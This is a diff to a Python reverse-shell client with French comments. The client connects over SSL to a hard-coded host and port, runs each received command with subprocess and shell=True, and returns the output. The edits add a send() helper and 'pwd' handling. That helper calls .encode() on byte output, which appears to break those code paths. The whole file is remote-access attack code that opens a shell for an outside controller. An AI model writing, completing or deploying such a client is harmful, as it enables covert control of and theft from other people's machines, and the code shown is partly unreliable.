@@ -12,6 +12,9 @@ import ssl
 import subprocess
 import os
 
+def send(data):
+    wrappedSocket.sendall(data.encode()) 
+
 # /!\ MODIFIER @ HOST AVANT D'EXECUTER LE PROGRAMME
 HOST = '192.168.1.6'
 PORT = 25566
@@ -43,8 +46,8 @@ try:
             if cmd[0] == "cd" or cmd[0] == "CD":
                 os.chdir(cmd[1])
                 # à supprimer (debug)
-                output = "Changed directory to {}".format(cmd[1])
-                wrappedSocket.sendall(output.encode())
+                output = "Changed directory to {}".format(os.getcwd())
+                send(output)
             elif cmd[0] == "cp" or cmd[0] == "CP":
                 print(cmd)
             elif cmd[0] == "q" or cmd[0] == "quit" or cmd[0] == "exit":
@@ -56,19 +59,23 @@ try:
                                        stderr=subprocess.PIPE)
                 output, err = command.communicate(timeout=60)
                 if not err:
-                    wrappedSocket.sendall(output)
+                    send(output)
                 elif not output:
-                    wrappedSocket.sendall(err)
+                    send(err)
                 else:
-                    wrappedSocket.sendall("err")
+                    send("[-] Error: couldn't send data")
         else:
-            command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
-                                       stderr=subprocess.PIPE)
-            output, err = command.communicate()
-            if not err:
-                wrappedSocket.sendall(output)
-            else:
-                wrappedSocket.sendall(err)
+            if cmd[0] == "pwd":
+                output = os.getcwd()
+                send(output)
+            else :
+                command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
+                                        stderr=subprocess.PIPE)
+                output, err = command.communicate()
+                if not err:
+                    send(output)
+                else:
+                    send(err)
 except Exception:
     exit(-1)
 finally:
